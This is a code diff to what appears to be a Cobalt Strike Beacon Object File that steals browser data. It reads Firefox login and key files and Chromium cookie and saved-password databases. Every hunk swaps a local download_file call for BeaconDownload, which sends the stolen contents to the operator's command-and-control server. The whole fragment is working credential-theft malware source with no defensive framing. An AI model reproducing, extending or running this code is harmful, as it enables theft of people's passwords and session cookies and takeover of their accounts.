@@ -546,7 +546,8 @@ VOID GetFirefoxInfo() {
         DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
         CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
         KERNEL32$ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-        download_file(logins, buffer, dwFileSize);
+        BeaconDownload(logins, buffer, dwFileSize);
+        //download_file(logins, buffer, dwFileSize);
         KERNEL32$GlobalFree(buffer);
         KERNEL32$CloseHandle(hFile);  
     }
@@ -567,7 +568,8 @@ VOID GetFirefoxInfo() {
         DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
         CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
         KERNEL32$ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-        download_file(database, buffer, dwFileSize);
+        BeaconDownload(database, buffer, dwFileSize);
+        //download_file(database, buffer, dwFileSize);
         KERNEL32$GlobalFree(buffer);
         KERNEL32$CloseHandle(hFile);
     }
@@ -671,7 +673,8 @@ VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPa
             }
 
         } else {
-            download_file(cookieDB,data, sizeof(data));
+            BeaconDownload(cookieDB, data, sizeof(data));
+            //download_file(cookieDB,data, sizeof(data));
         }
         //download_file(cookieDB,data, sizeof(data));
         KERNEL32$GlobalFree(data);
@@ -695,7 +698,8 @@ VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPa
                 KERNEL32$CloseHandle(hFile);
             }
         } else {
-            download_file(passwordDB,passwordData, sizeof(passwordData));
+            BeaconDownload(passwordDB, passwordData, sizeof(passwordData));
+            //download_file(passwordDB,passwordData, sizeof(passwordData));
         }
         //download_file(passwordDB,passwordData, sizeof(passwordData));
         KERNEL32$GlobalFree(passwordData);
@@ -864,7 +868,8 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to write password file to %s\n", copyFilePath);
                     }
                 } else {
-                    download_file(downloadFileName, buffer, dwFileSize);
+                    BeaconDownload(downloadFileName, buffer, dwFileSize);
+                    //download_file(downloadFileName, buffer, dwFileSize);
                 }
 
                 result = TRUE;
